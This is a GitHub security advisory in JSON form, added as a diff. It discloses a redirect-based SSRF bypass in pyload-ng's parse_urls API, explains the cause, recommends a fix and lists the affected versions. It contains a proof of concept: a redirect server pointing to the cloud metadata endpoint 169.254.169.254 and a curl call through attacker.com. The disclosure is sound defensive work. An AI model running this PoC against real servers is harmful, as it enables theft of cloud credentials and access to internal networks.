@@ -1,0 +1,151 @@
+{
+  "id": "GHSA-8rp3-xc6w-5qp5",
+  "modified": "2026-05-21T20:00:13.952871846Z",
+  "published": "2026-05-21T19:54:32Z",
+  "aliases": [
+    "CVE-2026-46561"
+  ],
+  "summary": "pyload-ng: SSRF via HTTP Redirect Bypass in parse_urls API",
+  "details": "## Summary\n\nThe SSRF mitigation added in commit `33c55da` for GHSA-7gvf-3w72-p2pg is incomplete. The `PREREQFUNCTION`-based private IP check was correctly applied to `HTTPChunk` (download path) but not to `HTTPRequest` (used by the `parse_urls` API). An authenticated attacker can supply a URL pointing to an attacker-controlled server that responds with a 302 redirect to an internal/private IP address, bypassing the `is_global_host()` check on the initial URL.\n\n## Details\n\nThe `parse_urls` API method validates the initial URL hostname:\n\n```python\n# src/pyload/core/api/__init__.py:600-604\nif url:\n    urlp = urlparse(url)\n    hostname = urlp.hostname\n    if urlp.scheme in (\"http\", \"https\") and hostname and is_global_host(hostname):\n        page = get_url(url)\n```\n\n`get_url()` is imported from `request_factory.py` and creates an `HTTPRequest` with default settings:\n\n```python\n# src/pyload/core/network/request_factory.py:58-64\ndef get_url(self, *args, **kwargs):\n    with HTTPRequest(None, self.get_options()) as h:\n        rep = h.load(*args, **kwargs)\n    return rep\n```\n\n`HTTPRequest.__init__` sets `allow_private_ip = True` by default:\n\n```python\n# src/pyload/core/network/http/http_request.py:75\nself.allow_private_ip = True\n```\n\nThe `init_handle()` method enables redirect following:\n\n```python\n# src/pyload/core/network/http/http_request.py:117-118\nself.c.setopt(pycurl.FOLLOWLOCATION, 1)\nself.c.setopt(pycurl.MAXREDIRS, 10)\n```\n\nThe `_pre_request_callback` that should block redirects to private IPs is a no-op when `allow_private_ip` is `True`:\n\n```python\n# src/pyload/core/network/http/http_request.py:574-582\ndef _pre_request_callback(self, conn_primary_ip, conn_local_ip, conn_primary_port, conn_local_port):\n    if not self.allow_private_ip and not is_global_address(conn_primary_ip):\n        return pycurl.PREREQFUNC_ABORT\n    return pycurl.PREREQFUNC_OK\n```\n\nThe fix at commit `33c55da` correctly set `allow_private_ip = False` in `HTTPChunk` (http_chunk.py:136) for the download path, but `HTTPRequest` used by `RequestFactory.get_url()` retains the default of `True`, leaving the `parse_urls` API unprotected against redirect-based SSRF.\n\n## PoC\n\n```bash\n# Step 1: Start a redirect server on attacker-controlled host\npython3 -c \"\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nclass H(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(302)\n        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')\n        self.end_headers()\nHTTPServer(('0.0.0.0', 8888), H).serve_forever()\n\"\n\n# Step 2: Authenticated user with ADD permission calls parse_urls\ncurl -X POST 'http://pyload-host:8000/api/parse_urls' \\\n  -H 'Cookie: session=\u003cvalid_session\u003e' \\\n  -d 'url=http://attacker.com:8888/redirect'\n\n# Expected flow:\n# 1. is_global_host('attacker.com') -\u003e True (passes validation)\n# 2. get_url() creates HTTPRequest with allow_private_ip=True\n# 3. pycurl fetches attacker.com:8888, receives 302 -\u003e http://169.254.169.254/latest/meta-data/\n# 4. _pre_request_callback runs but skips check (allow_private_ip=True)\n# 5. pycurl follows redirect to cloud metadata endpoint\n# 6. Response body parsed by RE_URLMATCH, any URLs in metadata returned to attacker\n```\n\n## Impact\n\nAn authenticated attacker with ADD permission can perform SSRF against:\n\n- **Cloud metadata endpoints** (AWS IMDSv1 at `169.254.169.254`, GCP, Azure) — potentially leaking IAM credentials, instance metadata, and secrets\n- **Internal services** on private networks (e.g., `10.x.x.x`, `172.16.x.x`, `192.168.x.x`)\n- **Localhost services** (`127.0.0.1`) running on the pyload server\n\nData exfiltration is partially limited by the `RE_URLMATCH` regex filter (only URL-like strings from the response body are returned), but cloud metadata responses often contain URLs or URL-like paths that match this pattern. The `REDIR_PROTOCOLS` setting limits redirects to HTTP/HTTPS only.\n\n## Recommended Fix\n\nSet `allow_private_ip = False` in `RequestFactory.get_url()`:\n\n```python\n# src/pyload/core/network/request_factory.py\ndef get_url(self, *args, **kwargs):\n    with HTTPRequest(None, self.get_options()) as h:\n        h.allow_private_ip = False  # Prevent SSRF via redirects\n        rep = h.load(*args, **kwargs)\n    return rep\n```\n\nAlternatively, change the default in `HTTPRequest.__init__` to `False`:\n\n```python\n# src/pyload/core/network/http/http_request.py:75\nself.allow_private_ip = False\n```\n\nThe second approach is more defensive (secure by default), but may require auditing other callers that legitimately need to access private IPs. The first approach is the targeted fix.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pyload-ng",
+        "purl": "pkg:pypi/pyload-ng"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.5.0b3.dev100"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.5.0a5.dev528",
+        "0.5.0a5.dev532",
+        "0.5.0a5.dev535",
+        "0.5.0a5.dev536",
+        "0.5.0a5.dev537",
+        "0.5.0a5.dev539",
+        "0.5.0a5.dev540",
+        "0.5.0a5.dev545",
+        "0.5.0a5.dev562",
+        "0.5.0a5.dev564",
+        "0.5.0a5.dev565",
+        "0.5.0a6.dev570",
+        "0.5.0a6.dev578",
+        "0.5.0a6.dev587",
+        "0.5.0a7.dev596",
+        "0.5.0a8.dev602",
+        "0.5.0a9.dev615",
+        "0.5.0a9.dev629",
+        "0.5.0a9.dev632",
+        "0.5.0a9.dev641",
+        "0.5.0a9.dev643",
+        "0.5.0a9.dev655",
+        "0.5.0a9.dev806",
+        "0.5.0b1.dev1",
+        "0.5.0b1.dev2",
+        "0.5.0b1.dev3",
+        "0.5.0b1.dev4",
+        "0.5.0b1.dev5",
+        "0.5.0b2.dev10",
+        "0.5.0b2.dev11",
+        "0.5.0b2.dev12",
+        "0.5.0b2.dev9",
+        "0.5.0b3.dev13",
+        "0.5.0b3.dev14",
+        "0.5.0b3.dev17",
+        "0.5.0b3.dev18",
+        "0.5.0b3.dev19",
+        "0.5.0b3.dev20",
+        "0.5.0b3.dev21",
+        "0.5.0b3.dev22",
+        "0.5.0b3.dev24",
+        "0.5.0b3.dev26",
+        "0.5.0b3.dev27",
+        "0.5.0b3.dev28",
+        "0.5.0b3.dev29",
+        "0.5.0b3.dev30",
+        "0.5.0b3.dev31",
+        "0.5.0b3.dev32",
+        "0.5.0b3.dev33",
+        "0.5.0b3.dev34",
+        "0.5.0b3.dev35",
+        "0.5.0b3.dev38",
+        "0.5.0b3.dev39",
+        "0.5.0b3.dev40",
+        "0.5.0b3.dev41",
+        "0.5.0b3.dev42",
+        "0.5.0b3.dev43",
+        "0.5.0b3.dev44",
+        "0.5.0b3.dev45",
+        "0.5.0b3.dev46",
+        "0.5.0b3.dev47",
+        "0.5.0b3.dev48",
+        "0.5.0b3.dev49",
+        "0.5.0b3.dev50",
+        "0.5.0b3.dev51",
+        "0.5.0b3.dev52",
+        "0.5.0b3.dev53",
+        "0.5.0b3.dev54",
+        "0.5.0b3.dev57",
+        "0.5.0b3.dev60",
+        "0.5.0b3.dev62",
+        "0.5.0b3.dev64",
+        "0.5.0b3.dev65",
+        "0.5.0b3.dev66",
+        "0.5.0b3.dev67",
+        "0.5.0b3.dev68",
+        "0.5.0b3.dev69",
+        "0.5.0b3.dev70",
+        "0.5.0b3.dev71",
+        "0.5.0b3.dev72",
+        "0.5.0b3.dev73",
+        "0.5.0b3.dev74",
+        "0.5.0b3.dev75",
+        "0.5.0b3.dev76",
+        "0.5.0b3.dev77",
+        "0.5.0b3.dev78",
+        "0.5.0b3.dev79",
+        "0.5.0b3.dev80",
+        "0.5.0b3.dev81",
+        "0.5.0b3.dev82",
+        "0.5.0b3.dev85",
+        "0.5.0b3.dev87",
+        "0.5.0b3.dev88",
+        "0.5.0b3.dev89",
+        "0.5.0b3.dev90",
+        "0.5.0b3.dev91",
+        "0.5.0b3.dev92",
+        "0.5.0b3.dev93",
+        "0.5.0b3.dev94",
+        "0.5.0b3.dev95",
+        "0.5.0b3.dev96",
+        "0.5.0b3.dev97",
+        "0.5.0b3.dev98",
+        "0.5.0b3.dev99"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-8rp3-xc6w-5qp5/GHSA-8rp3-xc6w-5qp5.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/pyload/pyload/security/advisories/GHSA-8rp3-xc6w-5qp5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/pyload/pyload"
+    }
+  ]
+}
